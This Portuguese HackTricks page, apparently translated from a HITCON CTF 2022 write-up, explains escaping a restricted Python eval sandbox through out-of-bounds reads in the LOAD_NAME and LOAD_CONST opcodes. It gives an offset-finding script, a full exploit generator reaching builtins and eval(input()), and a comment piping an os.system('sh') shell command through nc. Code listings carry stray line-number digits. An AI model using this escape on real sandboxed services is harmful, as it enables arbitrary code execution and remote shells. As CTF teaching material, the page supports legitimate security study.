# LOAD\_NAME / LOAD\_CONST opcode OOB Read

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Esta informação foi retirada** [**deste artigo**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Podemos usar a funcionalidade de leitura OOB no opcode LOAD\_NAME / LOAD\_CONST para obter algum símbolo na memória. O que significa usar truques como `(a, b, c, ... centenas de símbolos ..., __getattribute__) if [] else [].__getattribute__(...)` para obter um símbolo (como o nome de uma função) que você deseja.

Em seguida, basta criar seu exploit.

### Visão geral <a href="#overview-1" id="overview-1"></a>

O código-fonte é bastante curto, contendo apenas 4 linhas!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Você pode inserir código Python arbitrário e ele será compilado em um [objeto de código Python](https://docs.python.org/3/c-api/code.html). No entanto, `co_consts` e `co_names` desse objeto de código serão substituídos por uma tupla vazia antes de avaliar esse objeto de código.

Assim, todas as expressões que contêm constantes (por exemplo, números, strings etc.) ou nomes (por exemplo, variáveis, funções) podem causar falha de segmentação no final.

### Leitura fora dos limites <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Como ocorre a falha de segmentação?

Vamos começar com um exemplo simples, `[a, b, c]` pode ser compilado no seguinte bytecode.
```
  1           0 LOAD_NAME                0 (a)
              2 LOAD_NAME                1 (b)
              4 LOAD_NAME                2 (c)
              6 BUILD_LIST               3
              8 RETURN_VALUE12345
```
Mas e se o `co_names` se tornar uma tupla vazia? O opcode `LOAD_NAME 2` ainda é executado e tenta ler o valor daquele endereço de memória onde deveria estar originalmente. Sim, isso é uma "característica" de leitura fora dos limites.

O conceito principal para a solução é simples. Alguns opcodes no CPython, como `LOAD_NAME` e `LOAD_CONST`, são vulneráveis (?) à leitura fora dos limites.

Eles recuperam um objeto do índice `oparg` da tupla `consts` ou `names` (é isso que `co_consts` e `co_names` são chamados internamente). Podemos nos referir ao seguinte trecho curto sobre `LOAD_CONST` para ver o que o CPython faz quando processa o opcode `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
    PREDICTED(LOAD_CONST);
    PyObject *value = GETITEM(consts, oparg);
    Py_INCREF(value);
    PUSH(value);
    FAST_DISPATCH();
}1234567
```
Desta forma, podemos usar a função OOB para obter um "nome" de um deslocamento de memória arbitrário. Para ter certeza do nome que ele tem e qual é o seu deslocamento, basta tentar `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... E você pode encontrar algo em torno de oparg > 700. Você também pode tentar usar o gdb para dar uma olhada no layout da memória, mas eu não acho que seria mais fácil. 

### Gerando o Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Uma vez que recuperamos esses deslocamentos úteis para nomes/constantes, como podemos obter um nome/constante a partir desse deslocamento e usá-lo? Aqui está um truque para você:\
Vamos supor que podemos obter um nome `__getattribute__` do deslocamento 5 (`LOAD_NAME 5`) com `co_names=()`, então basta fazer o seguinte:
```python
[a,b,c,d,e,__getattribute__] if [] else [
    [].__getattribute__
    # you can get the __getattribute__ method of list object now!
]1234
```
> Observe que não é necessário nomeá-lo como `__getattribute__`, você pode nomeá-lo como algo mais curto ou estranho. 

Você pode entender a razão por trás disso apenas visualizando seu bytecode:
```python
              0 BUILD_LIST               0
              2 POP_JUMP_IF_FALSE       20
        >>    4 LOAD_NAME                0 (a)
        >>    6 LOAD_NAME                1 (b)
        >>    8 LOAD_NAME                2 (c)
        >>   10 LOAD_NAME                3 (d)
        >>   12 LOAD_NAME                4 (e)
        >>   14 LOAD_NAME                5 (__getattribute__)
             16 BUILD_LIST               6
             18 RETURN_VALUE
             20 BUILD_LIST               0
        >>   22 LOAD_ATTR                5 (__getattribute__)
             24 BUILD_LIST               1
             26 RETURN_VALUE1234567891011121314
```
Observe que `LOAD_ATTR` também recupera o nome de `co_names`. O Python carrega nomes do mesmo deslocamento se o nome for o mesmo, então o segundo `__getattribute__` ainda é carregado do deslocamento = 5. Usando esse recurso, podemos usar um nome arbitrário, desde que o nome esteja na memória próxima.

Gerar números deve ser trivial:

* 0: not \[\[]]
* 1: not \[]
* 2: (not \[]) + (not \[])
* ...

### Script de exploração <a href="#exploit-script-1" id="exploit-script-1"></a>

Não usei constantes devido ao limite de comprimento.

Aqui está um script para encontrarmos os deslocamentos desses nomes.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
    def __getitem__(self, k):
        if type(k) == str:
            return k


if __name__ == '__main__':
    n = int(argv[1])

    code = [
        *([opmap['EXTENDED_ARG'], n // 256]
          if n // 256 != 0 else []),
        opmap['LOAD_NAME'], n % 256,
        opmap['RETURN_VALUE'], 0
    ]

    c = CodeType(
        0, 0, 0, 0, 0, 0,
        bytes(code),
        (), (), (), '<sandbox>', '<eval>', 0, b'', ()
    )

    ret = eval(c, {'__builtins__': MockBuiltins()})
    if ret:
        print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
E o seguinte é para gerar o exploit real em Python.
```python
import sys
import unicodedata


class Generator:
    # get numner
    def __call__(self, num):
        if num == 0:
            return '(not[[]])'
        return '(' + ('(not[])+' * num)[:-1] + ')'

    # get string
    def __getattribute__(self, name):
        try:
            offset = None.__dir__().index(name)
            return f'keys[{self(offset)}]'
        except ValueError:
            offset = None.__class__.__dir__(None.__class__).index(name)
            return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
    while True:
        chr_code += 1
        char = unicodedata.normalize('NFKC', chr(chr_code))
        if char.isidentifier() and char not in names:
            names.append(char)
            break

offsets = {
    "__delitem__": 2800,
    "__getattribute__": 2850,
    '__dir__': 4693,
    '__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
             'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
    names[offset] = name

for i, var in enumerate(variables):
    assert var not in offsets
    names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
    get(get([],{_.__class__}),{_.__base__}),
    {_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
    builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Basicamente, ele faz as seguintes coisas para as strings que obtemos do método `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
  getattr(
    getattr(
      [].__getattribute__('__class__'),
    '__base__'),
  '__subclasses__'
  )()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
